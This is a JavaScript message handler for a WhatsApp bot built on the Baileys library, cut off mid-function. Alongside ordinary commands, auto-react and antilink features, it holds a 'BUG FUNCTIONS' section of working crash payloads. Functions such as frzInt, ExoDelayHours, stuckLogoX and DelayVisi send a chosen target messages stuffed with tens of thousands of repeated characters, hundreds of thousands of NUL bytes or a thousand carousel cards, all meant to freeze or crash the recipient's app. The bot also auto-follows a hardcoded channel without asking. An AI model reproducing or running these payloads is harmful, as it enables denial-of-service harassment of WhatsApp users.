/*

CODED BY KANEKI TECH INC 
*/
require('./lib/listmenu')
require('../setting/config')
// Safe Baileys import — only destructure what actually exists in this version
const _baileys = require("@whiskeysockets/baileys");
const baileys                    = _baileys.default || _baileys;
const proto                      = _baileys.proto;
const jidNormalizedUser          = _baileys.jidNormalizedUser;
const generateWAMessage          = _baileys.generateWAMessage;
const generateWAMessageFromContent = _baileys.generateWAMessageFromContent;
const getContentType             = _baileys.getContentType;
const prepareWAMessageMedia      = _baileys.prepareWAMessageMedia;
const downloadContentFromMessage = _baileys.downloadContentFromMessage;
const generateWAMessageContent   = _baileys.generateWAMessageContent;
const makeInMemoryStore          = _baileys.makeInMemoryStore;
const areJidsSameUser            = _baileys.areJidsSameUser;
const downloadAndSaveMediaMessage = _baileys.downloadAndSaveMediaMessage;
const BufferJSON                 = _baileys.BufferJSON;
const Browsers                   = _baileys.Browsers;
const fetchLatestBaileysVersion  = _baileys.fetchLatestBaileysVersion;
const getStream                  = _baileys.getStream;
const WAProto                    = _baileys.WAProto || proto;
// Legacy aliases — may be undefined in newer Baileys builds
const MediaType                  = _baileys.MediaType;
const WAMessageStatus            = _baileys.WAMessageStatus;
const Mimetype                   = _baileys.Mimetype;
const MessageType                = _baileys.MessageType;
const Presence                   = _baileys.Presence;
const WA_DEFAULT_EPHEMERAL       = _baileys.WA_DEFAULT_EPHEMERAL || 0;

const fs = require('fs')
const path = require('path')
const util = require('util')
const { spawn, exec } = require('child_process')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const cheerio = require('cheerio');
const sharp = require('sharp')
const fg = require('api-dylux')
const FormData = require('form-data')
const { modul } = require('./module')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const jimp = require("jimp")
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { googleTTS, } = modul
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('../system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('../system/exif.js')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const { shorturl, } = require("./lib/myfunc3");
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const translate = require("@vitalets/google-translate-api");
const ban = JSON.parse(fs.readFileSync("./start/lib/banned.json"))
global._antilink    = global._antilink    || {};
global.stickerCmds  = global.stickerCmds  || {};
global.autoReact    = global.autoReact    || {};
global.autoLike     = global.autoLike     !== undefined ? global.autoLike  : false;
global.autoread     = global.autoread     !== undefined ? global.autoread  : false;
global.autobio      = global.autobio      !== undefined ? global.autobio   : false;

// ── Module-level cache: read once on startup, never again on every message ───
let _menuimg, _bugimg, _thumb, _image1, _tdxlol, _kanekiplay;
function _loadMedia() {
  if (_menuimg) return; // already loaded
  try { _menuimg   = fs.readFileSync('./media/menuIMG.jpg'); }   catch(_) { _menuimg   = Buffer.alloc(0); }
  try { _bugimg    = fs.readFileSync('./media/bugIMG.jpg'); }    catch(_) { _bugimg    = Buffer.alloc(0); }
  try { _thumb     = fs.readFileSync('./media/thumb.png'); }     catch(_) { _thumb     = Buffer.alloc(0); }
  try { _image1    = fs.readFileSync('./media/image1.jpg'); }    catch(_) { _image1    = Buffer.alloc(0); }
  try { _tdxlol    = fs.readFileSync('./tdx.jpeg'); }            catch(_) { try { _tdxlol = fs.readFileSync('./media/image1.jpg'); } catch(__) { _tdxlol = Buffer.alloc(0); } }
  try { _kanekiplay = fs.readFileSync('./media/radiate.mp3'); }   catch(_) { try { _kanekiplay = fs.readFileSync('./media/radiation.mp3'); } catch(__) { _kanekiplay = Buffer.alloc(0); } }
}
_loadMedia();

// ── Restore persisted toggle states so they survive restarts ──────────────────
try { global.autoReact = JSON.parse(fs.readFileSync('./system/autoreact.json','utf8')); } catch(_) {}
try { const _al = JSON.parse(fs.readFileSync('./system/autolike.json','utf8'));  global.autoLike  = _al.enabled; } catch(_) {}
try { const _ar = JSON.parse(fs.readFileSync('./system/autoread.json','utf8'));  global.autoread  = _ar.enabled; } catch(_) {}
try { const _ab = JSON.parse(fs.readFileSync('./system/autobio.json','utf8'));   global.autobio   = _ab.enabled; } catch(_) {}

module.exports = kaneki = async (kaneki, m, chatUpdate, store) => {

const { from } = m
try {
      
const body = (
  // Pesan teks biasa
  m.mtype === "conversation" ? m.message.conversation :
  m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

  // Pesan media dengan caption
  ["imageMessage", "videoMessage", "documentMessage", "audioMessage", "stickerMessage"]
    .includes(m.mtype) ? m.message[m.mtype].caption || "" :

  // Pesan interaktif (tombol, list, dll.)
  m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

  // Pesan khusus
  m.mtype === "messageContextInfo" ? (
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || 
    m.text
  ) :
  m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
  m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
  m.mtype === "contactsArrayMessage" ? 
    m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
  ["locationMessage", "liveLocationMessage"].includes(m.mtype) ? 
    `${m.message[m.mtype].degreesLatitude}, ${m.message[m.mtype].degreesLongitude}` :
  ["pollCreationMessage", "pollUpdateMessage"].includes(m.mtype) ? m.message[m.mtype].name :
  m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :

  // Pesan sekali lihat (View Once)
  ["viewOnceMessage", "viewOnceMessageV2", "viewOnceMessageV2Extension"].includes(m.mtype) ? (
    m.message[m.mtype].message.imageMessage?.caption || 
    m.message[m.mtype].message.videoMessage?.caption || 
    "[Pesan sekali lihat]"
  ) :

  // Pesan sementara (ephemeralMessage)
  m.mtype === "ephemeralMessage" ? (
    m.message.ephemeralMessage.message.conversation ||
    m.message.ephemeralMessage.message.extendedTextMessage?.text || 
    "[Pesan sementara]"
  ) :

  // Pesan lain
  m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :
  m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :
  ""
);
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? prefa;
const isCmd = (typeof body === 'string' && body.startsWith(prefix)) ? true : false;
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "";
const eai = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(prefix.length ? 1 : 2);
// ── JSON config: cached with 60s TTL so disk isn't hit every message ──────────
function _cachedJson(key, file, ttl = 60_000) {
  const now = Date.now();
  if (global[key] && now - global[key]._ts < ttl) return global[key].data;
  try { global[key] = { data: JSON.parse(fs.readFileSync(file,'utf8')), _ts: now }; }
  catch(_) { global[key] = global[key] || { data: [], _ts: now }; }
  return global[key].data;
}
const owner   = _cachedJson('_ownerCache',   './system/owner.json');
const Premium = _cachedJson('_premiumCache', './system/premium.json');
const menuimg  = _menuimg;
const bugimg   = _bugimg;
const thumb    = _thumb;
const image1   = _image1;
const tdxlol   = _tdxlol;
const kanekiplay = _kanekiplay;
const botNumber = global._botNumber || (global._botNumber = await kaneki.decodeJid(kaneki.user.id));
let q;
const text = q = args.join(" ")
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const isPremium = [...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const qtext = args.join(" "); // single declaration of qtext
global.statusSave = global.statusSave !== undefined ? global.statusSave : false;
const quoted = m.quoted ? m.quoted : m;
// 'from' is already declared at top via destructuring, reassign here
// const from = m.key.remoteJid;  // FIXED: removed duplicate declaration
const sender = m.isGroup ? (m.key.participant || m.participant) : m.key.remoteJid;
const isban = ban.includes(m.sender)
global._groupMetaCache = global._groupMetaCache || new Map();
async function getCachedGroupMeta(kaneki, jid) {
  const cache = global._groupMetaCache;
  const now   = Date.now();
  const hit   = cache.get(jid);
  if (hit && now - hit.ts < 30_000) return hit.data;
  try {
    const data = await kaneki.groupMetadata(jid);
    cache.set(jid, { data, ts: now });
    return data;
  } catch { return null; }
}
const groupMetadata  = m.isGroup ? await getCachedGroupMeta(kaneki, from) : null;
const groupName      = groupMetadata?.subject || 'Unknown Group';
const participants   = m.isGroup ? groupMetadata?.participants || [] : [];
const GroupAdmins    = (m.isGroup && participants.length) ? await getGroupAdmins(participants) : [];
const BotAdmins      = m.isGroup ? GroupAdmins.includes(botNumber) : false;
const Admins         = m.isGroup ? GroupAdmins.includes(m.sender) : false;
const pushname = m.pushName || "No Name";
// ── Aliases used throughout the file ────────────────────────────────────────
const isAdmins   = Admins;      // alias: GroupAdmins.includes(m.sender)
const isBotAdmins = BotAdmins;  // alias: GroupAdmins.includes(botNumber)
// ── Shared config globals with safe fallbacks ────────────────────────────────
const ownername  = global.ownername || 'Owner';
const link       = global.link      || 'https://t.me/certifiedloner_16';
let   autobio    = global.autobio !== undefined ? global.autobio : false;
// ── mess: common reply strings ───────────────────────────────────────────────
const mess = {
  group:      'This command can only be used in a group!',
  grouponly:  'This command can only be used in a group!',
  admin:      'You must be an admin to use this command!',
  botAdmin:   'Bot must be an admin first!',
  only: {
    group:    'This command can only be used in a group!',
    admin:    'Admins only!',
  }
};
// ── zets: quoted context used in toimage case ────────────────────────────────
const zets = m;
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z');
const mime = (quoted.msg || quoted).mimetype || '';
const isMedia = /image|video|sticker|audio/.test(mime);
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric'
});
const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
const kanekiImg = "https://i.ibb.co/LzXSLVv9/x.jpg";
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reaction = async (jidss, emoji) => {
    kaneki.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
    
// ── AUTO-REACT: fires for every chat where enabled, never blocks command path ─
const AUTO_REACT_EMOJIS = [
  "💨","😁","😂","🤣","😃","😄","😅","😆","😉","😊","😍","😘","😎","🤩","🤔",
  "😏","😣","😥","😮","🤐","😪","😫","😴","😌","😛","😜","😝","🤤","😒","😓",
  "😔","😕","🙃","🤑","😲","😖","😞","😟","😤","😢","😭","😨","😩","🤯","😬",
  "😰","😱","🥵","🥶","😳","🤪","🔥","😠","😷","🤒","🤕","🤢","🤮","🤧","😇",
  "🥳","🤠","🤡","🤥","🤫","🤭","🧐","🤓","😈","👿","👹","👺","💀","👻","🤖",
  "🎃","😺","😸","😹","😻","😼","😽","🙀","😿","😾","💋","💌","💘","💝","💖",
  "💗","💓","💞","💕","💟","💔","❤️","🧡","💛","💚","💙","💜","🖤","🤍","🤎"
];
if (global.autoReact[m.chat] && !m.key.fromMe) {
  setImmediate(() => {
    const emoji = AUTO_REACT_EMOJIS[Math.floor(Math.random() * AUTO_REACT_EMOJIS.length)];
    kaneki.sendMessage(m.chat, { react: { text: emoji, key: m.key } })
      .catch(e => console.error('[autoReact] error:', e.message));
  });
}
if (global.autoread) setImmediate(() => kaneki.readMessages([m.key]).catch(() => {}));
// ── AUTO-LIKE: react to ALL status updates with varied emojis ─────────────────
const STATUS_LIKE_EMOJIS = ['❤️','🔥','😍','👏','🎉','💯','😂','😮','😢','🙏','💪','✅','🫡','🥰','😎'];
if (global.autoLike && m.key?.remoteJid === 'status@broadcast' && !m.key?.fromMe) {
  setImmediate(async () => {
    const statusSender = m.key.participant || m.sender || m.key.remoteJid;
    const emoji = STATUS_LIKE_EMOJIS[Math.floor(Math.random() * STATUS_LIKE_EMOJIS.length)];
    try {
      await kaneki.sendMessage('status@broadcast', {
        react: { text: emoji, key: m.key }
      }, { statusJidList: [statusSender] });
    } catch (e) {
      console.error('[autoLike] error:', e.message);
    }
  });
}
// (owner-specific react folded into global.autoReact — enable per chat with autoreact on)
// ── Channel follow: init once at module load, not per message ────────────────
const channelId = ["120363424103965290@newsletter"];
if (!global._followedChannels) {
  try {
    const _fcData = fs.readFileSync('./followedChannels.json', 'utf8');
    global._followedChannels = new Set(JSON.parse(_fcData));
  } catch(_) { global._followedChannels = new Set(); }
}
if (!global._newsletterFollowed) {
  const _chToFollow = channelId[0];
  if (!global._followedChannels.has(_chToFollow)) {
    try {
      kaneki.newsletterFollow(_chToFollow);
      global._followedChannels.add(_chToFollow);
      fs.writeFileSync('./followedChannels.json', JSON.stringify([...global._followedChannels]));
    } catch(e) { console.warn('[newsletter] follow error:', e.message); }
  }
  global._newsletterFollowed = true;
}
if (prefix && command) {
function getCaseNames() {
  if (global._cachedCaseNames) return global._cachedCaseNames;
  try {
    const data = fs.readFileSync('./start/case.js', 'utf8');
    const names = new Set();
    // Match both single-quoted and double-quoted case labels
    const re = /case\s+['"]([^'"]+)['"]/g;
    let match;
    while ((match = re.exec(data)) !== null) names.add(match[1]);
    global._cachedCaseNames = [...names];
    return global._cachedCaseNames;
  } catch (err) {
    console.warn('[getCaseNames] error:', err.message);
    return [];
  }
}
let caseNames = getCaseNames();
let noPrefix = command;
let mean = didyoumean(noPrefix, caseNames);
let sim  = mean ? similarity(noPrefix, mean) : 0;
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
  m.reply(`ɪ ᴅɪᴅ ɴᴏᴛ ᴜɴᴅᴇʀsᴛᴀɴᴅ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ — ᴅɪᴅ ʏᴏᴜ ᴍᴇᴀɴ?\n √ ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`);
}}

// Persist antilink state across messages
global.antilinkStatus = global.antilinkStatus || {};
const antilinkStatus = global.antilinkStatus;
if (autobio && !global._bioUpdated) {
  kaneki.updateProfileStatus(`🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪  ʙʏ ${ownername}`).catch(_ => _);
  global._bioUpdated = true;
  setTimeout(() => { global._bioUpdated = false; }, 60000); // refresh every 60s
}
        if(command) {
  console.log(chalk.hex("#6f00ff")(`
        < kaneki - Tech >
    - Command : ${prefix + command}, 
    - From : ${m.sender}
  `)) 
}
const ThumbUrl = "https://pomf2.lain.la/f/5l5eayi.jpg"
const reply = (teks) => {
kaneki.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": _image1,
"sourceUrl": `${link}`}}},
{ quoted: m})
}
const example = (teks) => {
return `Usage : *${prefix+command}* ${teks}`
}
const replygc = (teks) => {
kaneki.sendMessage(from, { text: teks }, { quoted : m})
}
const glxNull = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '18002428478@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "_🇨 🇪 🇳 🇹 🇮 🇵 🇪 🇩 🇪 _",
                        "format": "DEFAULT",
                        "caption": "BY kaneki"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Alwaysaqioo@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(10)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
        
const cursor = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: ""
},
message: {
buttonsMessage: {
hasMediaAttachment: true,
contentText: `私はあなたが好き`,
footerText: ``,
buttons: [
{ buttonId: "\u0000".repeat(749999), buttonText: { displayText: "Kalknetrust" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }
], 
viewOnce: true,
headerType: 1
}
}, 
contextInfo: {
virtexId: kaneki.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
}, 
};
const LbReceipt = (teks) => {
  const msg = {
    interactiveMessage: {
     title: teks,
      image: (() => { try { return fs.readFileSync('./media/botpic.jpg'); } catch(_) { return fs.readFileSync('./media/menuIMG.jpg'); } })(),
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "kaneki - Tech",
            url: "t.me/certifiedloner_16",
            copy_code: "kaneki - WaBot",
            expiration_time: Date.now() * 999
          }
        }),
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              display_text: "Telegram Creator",
              url: "https://t.me/certifiedloner_16"
            })
          }
        ]
      }
    }
  };

  return kaneki.sendMessage(m.chat, msg, { quoted: m });
};
const BugSentX = async (teks) => {
  const msg = {
    text: teks,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      externalAdReply: {
        title: "𝘾𝙚𝙣𝙩𝙞𝙥𝙚𝙙𝙚 𝙫4",
        body: "telegram.com",
        mediaType: 1,
        sourceUrl: "https://telegram.com",
        thumbnail: (() => { try { return fs.readFileSync('./media/botpic.jpg'); } catch(_) { return fs.readFileSync('./media/menuIMG.jpg'); } })(),
        renderLargerThumbnail: false,
        showAdAttribution: false,
      }
    }
  };

  return kaneki.sendMessage(m.chat, msg, { quoted: m });
};
const getDevice = require("@whiskeysockets/baileys").getDevice
// end reply 
if (!kaneki.public) {
if (!isCreator) return
}
// writeExif is only available from Data2, others already imported at top level
const { writeExif } = require('../system/Data2')
const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: menuimg,
      itemCount: "8888",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `kaneki Tech`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}


const {
    sendGmail,
    formatSize,
} = require('./lib/myfunction');

const bubbleCharMap = {
    'a':'ⓐ','b':'ⓑ','c':'ⓒ','d':'ⓓ','e':'ⓔ','f':'ⓕ','g':'ⓖ','h':'ⓗ','i':'ⓘ','j':'ⓙ',
    'k':'ⓚ','l':'ⓛ','m':'ⓜ','n':'ⓝ','o':'ⓞ','p':'ⓟ','q':'ⓠ','r':'ⓡ','s':'ⓢ','t':'ⓣ',
    'u':'ⓤ','v':'ⓥ','w':'ⓦ','x':'ⓧ','y':'ⓨ','z':'ⓩ',
    'A':'Ⓐ','B':'Ⓑ','C':'Ⓒ','D':'Ⓓ','E':'Ⓔ','F':'Ⓕ','G':'Ⓖ','H':'Ⓗ','I':'Ⓘ','J':'Ⓙ',
    'K':'Ⓚ','L':'Ⓛ','M':'Ⓜ','N':'Ⓝ','O':'Ⓞ','P':'Ⓟ','Q':'Ⓠ','R':'Ⓡ','S':'Ⓢ','T':'Ⓣ',
    'U':'Ⓤ','V':'Ⓥ','W':'Ⓦ','X':'Ⓧ','Y':'Ⓨ','Z':'Ⓩ'
};
const glitchCharMap = {
    'a':'̷a','b':'̷b','c':'̷c','d':'̷d','e':'̷e','f':'̷f','g':'̷g','h':'̷h','i':'̷i',
    'j':'̷j','k':'̷k','l':'̷l','m':'̷m','n':'̷n','o':'̷o','p':'̷p','q':'̷q','r':'̷r',
    's':'̷s','t':'̷t','u':'̷u','v':'̷v','w':'̷w','x':'̷x','y':'̷y','z':'̷z',
    'A':'̷A','B':'̷B','C':'̷C','D':'̷D','E':'̷E','F':'̷F','G':'̷G','H':'̷H','I':'̷I',
    'J':'̷J','K':'̷K','L':'̷L','M':'̷M','N':'̷N','O':'̷O','P':'̷P','Q':'̷Q','R':'̷R',
    'S':'̷S','T':'̷T','U':'̷U','V':'̷V','W':'̷W','X':'̷X','Y':'̷Y','Z':'̷Z'
};
const fancyCharMap = {
    'a': '𝒜', 'b': 'ℬ', 'c': '𝒞', 'd': '𝒟', 'e': 'ℰ', 'f': 'ℱ', 'g': '𝒢',
    'h': 'ℋ', 'i': 'ℐ', 'j': '𝒥', 'k': '𝒦', 'l': 'ℒ', 'm': 'ℳ', 'n': '𝒩',
    'o': '𝒪', 'p': '𝒫', 'q': '𝒬', 'r': 'ℛ', 's': '𝒮', 't': '𝒯', 'u': '𝒰',
    'v': '𝒱', 'w': '𝒲', 'x': '𝒳', 'y': '𝒴', 'z': '𝒵',
    'A': '𝒜', 'B': 'ℬ', 'C': '𝒞', 'D': '𝒟', 'E': 'ℰ', 'F': 'ℱ', 'G': '𝒢',
    'H': 'ℋ', 'I': 'ℐ', 'J': '𝒥', 'K': '𝒦', 'L': 'ℒ', 'M': 'ℳ', 'N': '𝒩',
    'O': '𝒪', 'P': '𝒫', 'Q': '𝒬', 'R': 'ℛ', 'S': '𝒮', 'T': '𝒯', 'U': '𝒰',
    'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵',
};

//==============================//
if (m.mimetype === 'image/webp' && m.fileSha256) {
    const hash = m.fileSha256.toString('base64');
    const mappedCommand = global.stickerCmds[hash];
    if (mappedCommand) {
        m.text = mappedCommand;
        command = mappedCommand;
        isCmd = true;
    }
}
// Add this part outside the switch, in your message handler:
if (m.isGroup && global._antilink[m.chat]) {
    const linkRegex = /(https?:\/\/[^\s]+)/gi;
    if (linkRegex.test(m.text) && !isAdmins && !isCreator) {
        const warningText = "WARNING: Sending links is not allowed in this group!";
        await kaneki.sendMessage(m.chat, { text: warningText }, { quoted: m });
        // Optional: Kick user
        // await conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    }
}

if (m.isGroup && antilinkStatus[m.chat]) {
    const detectLink = /(https?:\/\/[^\s]+)|(\b\S*\.com\S*\b)/gi;
    if (detectLink.test(m.text)) {
        if (!isAdmins && !m.key.fromMe) {
            await kaneki.sendMessage(m.chat, { delete: m.key });
        }
    }
}
// === POLL FUNCTION ===
const sendPollButtonMenu = async (kaneki, jid, quotedMsg) => {
  const pollMessage = {
    text: "*What is your favorite food?*",
    footer: "Choose one option below",
    buttons: [
      { buttonId: 'vote1', buttonText: { displayText: 'Rice' }, type: 1 },
      { buttonId: 'vote2', buttonText: { displayText: 'Bread' }, type: 1 },
      { buttonId: 'vote3', buttonText: { displayText: 'Cake' }, type: 1 }
    ],
    headerType: 1
  };

  await kaneki.sendMessage(jid, pollMessage, { quoted: quotedMsg });
};

// BUG FUNCTIONS 
async function frzInt(target) {
  kaneki.relayMessage(target, {
    interactiveResponseMessage: {
      body: {
        text: "kaneki",
        format: 1
      },
      contextInfo: {
        participant: "13135550302@s.whatsapp.net",
        quotedMessage: {
          protocolMessage: {
            type: 25
          }
        },
        remoteJid: "status@broadcast"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"wa_flow_response_params\":{\"title\":${"𑇂𑆵𑆴𑆿".repeat(60000)},\"flow_id\":\"floww\"}}`,
        version: 3
      }
    }
  }, {})
}
//=========[ END OF BUGS ]==========//
async function frzInt2(target) {
  WaSocket.relayMessage(target, {
    interactiveResponseMessage: {
      body: {
        text: "7eppsynC",
        format: 1
      },
      contextInfo: {
        participant: "13135550302@s.whatsapp.net",
        quotedMessage: {
          protocolMessage: {
            type: 25
          }
        },
        remoteJid: "status@broadcast"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"wa_flow_response_params\":{\"title\":${"𑇂𑆵𑆴𑆿".repeat(60000)},\"flow_id\":\"floww\"}}`,
        version: 3
      }
    }
  }, {
    participant: { jid: target }
  })
}
//==========[ DELAY BUG FUNCTION ]=========//
async function ExoDelayHours(target, ptcp = true) {
let CardsX = [];

for (let r = 0; r < 1000; r++) {
CardsX.push({
body: { text: '' },
header: {
title: '',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "98",
height: 4,
width: 4,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: '',
}
});
}

let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { text: '🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶' },
carouselMessage: {
cards: CardsX
},
contextInfo: {
remoteJid: Math.random().toString(36) + "Mals",
isForwarded: true,
forwardingScore: 999,
urlTrackingMap: {
urlTrackingMapElements: Array.from({ length: 5000 }, () => ({
"\u0000": "\u0000"
}))
}
}
}
}
}
}, {});

await kaneki.relayMessage(target, {
groupStatusMessageV2: {
message: msg.message,
},
}, ptcp ?
{ 
messageId: msg.key.id, 
participant: { jid: target },
} : { messageId: msg.key.id }
);
}
//======== END OF BUG ==========//
//-----------( BLANK HARD )------------//
async function stuckLogoX(kaneki, target) {
  await kaneki.relayMessage(
    target,
    {
      interactiveMessage: {
        body: { text: "R9X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_info",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4TWOZ803CWN\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"payment_key\",\"payment_key\":{\"type\":\"IDPAYMENTACCOUNT\",\"key\":\"" + `${".".repeat(30000)}` + "\",\"name\":\"OVO\",\"institution_name\":\"OVO\",\"full_name_on_account\":\"R9X \",\"account_type\":\"wallet\"}}],\"share_payment_status\":false,\"referral\":\"chat_attachment\"}"
            }
          ]
        }
      }
    }
  );
}
//----------( END OF BUG )----------//
//----------( Bug function )-------//
async function DelayVisi(kaneki, target) {
  const RumahRoblokKa = generateWAMessageFromContent(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "VSX",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"999999","building_name":"visi","landmark_area":"X","address":"RumahRoblokKa","tower_number":"RumahRoblokKa","city":"arab","name":"RumahRoblokKa","phone_number":"999999999999","house_number":"xxx","floor_number":"smkui","state":"RumahRoblokKa | ${"\u0000".repeat(900000)}"}}`,
              version: 3
            }
          }
        }
      }
    },
    {
      userJid: target,
      quoted: null
    }
  );

  await kaneki.relayMessage(target, RumahRoblokKa.message, {
    participant: { jid: target },
    messageId: RumahRoblokKa.key.id
  });
}
//-----------( IOS BUGS )----------------//
async function TrashLocIosX(target, ptcp = true) {
  let msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.9996311899,
